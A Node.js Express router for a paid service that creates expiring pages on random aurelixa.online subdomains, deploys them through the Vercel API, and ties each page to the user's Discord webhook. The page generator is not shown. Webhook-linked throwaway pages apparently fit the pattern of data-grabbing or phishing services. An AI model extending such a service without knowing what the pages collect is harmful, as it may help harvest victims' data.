const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const axios = require('axios');
const User = require('../models/User');
const Deployment = require('../models/Deployment');
const { generateDeployedPage } = require('../utils/deployPage');
const router = express.Router();

function checkToken(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  try {
    const decoded = jwt.verify(authHeader.split(' ')[1], process.env.JWT_SECRET);
    req.userId = decoded.userId;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
}

// ===== GET MY DEPLOYMENTS =====
router.get('/my', checkToken, async (req, res) => {
  try {
    const deployments = await Deployment.find({ userId: req.userId, active: true }).sort({ createdAt: -1 });
    res.json({ deployments });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== GET ALL DEPLOYMENTS (HISTORY) =====
router.get('/all', checkToken, async (req, res) => {
  try {
    const deployments = await Deployment.find({ userId: req.userId }).sort({ createdAt: -1 });
    res.json({ deployments });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== NEW DEPLOYMENT (VIA VERCEL) =====
router.post('/new', checkToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!user.webhook) return res.status(400).json({ error: 'Set Discord webhook first' });

    const today = new Date().toDateString();
    let dailyLimit = 2;
    if (user.plan === 'pro') dailyLimit = 10;
    if (user.plan === 'elite') dailyLimit = 50;
    if (user.plan === 'lifetime') dailyLimit = 999;
    if (user.role === 'owner') dailyLimit = 999;

    if (user.lastDeployDate === today && user.dailyDeploys >= dailyLimit) {
      return res.status(429).json({ error: 'Daily limit reached', limit: dailyLimit, used: user.dailyDeploys });
    }

    let hours = 1;
    if (user.plan === 'pro') hours = 24;
    if (user.plan === 'elite') hours = 48;
    if (user.plan === 'lifetime') hours = 9999;
    if (user.role === 'owner') hours = 9999;

    const expiresAt = new Date();
    expiresAt.setHours(expiresAt.getHours() + hours);

    const subdomain = `${crypto.randomBytes(4).toString('hex')}-${user._id.toString().slice(-6)}`;
    const url = `https://${subdomain}.aurelixa.online`;

    // Generate page HTML
    const pageHTML = generateDeployedPage(user.webhook, subdomain);

    // SAVE TO DATABASE
    const deployment = new Deployment({
      userId: user._id,
      subdomain,
      url,
      webhook: user.webhook,
      pageHTML,
      expiresAt,
      active: true
    });
    await deployment.save();

    // DEPLOY TO VERCEL VIA API
    try {
      const vercelToken = process.env.VERCEL_TOKEN;
      const vercelProjectId = process.env.VERCEL_PROJECT_ID;
      
      if (vercelToken && vercelProjectId) {
        // Create deployment on Vercel
        await axios.post(`https://api.vercel.com/v13/deployments?projectId=${vercelProjectId}`, {
          name: subdomain,
          files: [
            {
              file: 'index.html',
              data: Buffer.from(pageHTML).toString('base64')
            }
          ],
          projectSettings: {
            framework: null
          }
        }, {
          headers: {
            'Authorization': `Bearer ${vercelToken}`,
            'Content-Type': 'application/json'
          }
        });
        console.log('✅ Deployed to Vercel:', subdomain);
      } else {
        // Fallback: save page to database for Render serving
        console.log('⚠️ Vercel deployment skipped, using Render fallback');
      }
    } catch (vercelError) {
      console.error('❌ Vercel deployment error:', vercelError.message);
      // Continue anyway, page is saved in database
    }

    // Update user daily count
    if (user.lastDeployDate === today) {
      user.dailyDeploys++;
    } else {
      user.dailyDeploys = 1;
      user.lastDeployDate = today;
    }
    await user.save();

    res.json({
      success: true,
      url,
      subdomain,
      expiresAt,
      expiresIn: `${hours} hour${hours > 1 ? 's' : ''}`,
      dailyDeploysUsed: user.dailyDeploys,
      dailyDeploysLeft: dailyLimit - user.dailyDeploys
    });

  } catch (error) {
    console.error('❌ Deploy error:', error);
    res.status(500).json({ error: error.message });
  }
});

// ===== DELETE DEPLOYMENT =====
router.delete('/:subdomain', checkToken, async (req, res) => {
  try {
    const { subdomain } = req.params;
    const deployment = await Deployment.findOne({ subdomain });
    
    if (!deployment) {
      return res.status(404).json({ error: 'Deployment not found' });
    }
    
    if (deployment.userId.toString() !== req.userId) {
      return res.status(403).json({ error: 'Not yours' });
    }
    
    deployment.active = false;
    await deployment.save();
    
    res.json({ success: true, message: 'Deployment deleted' });
  } catch (error) {
    console.error('❌ Delete error:', error);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
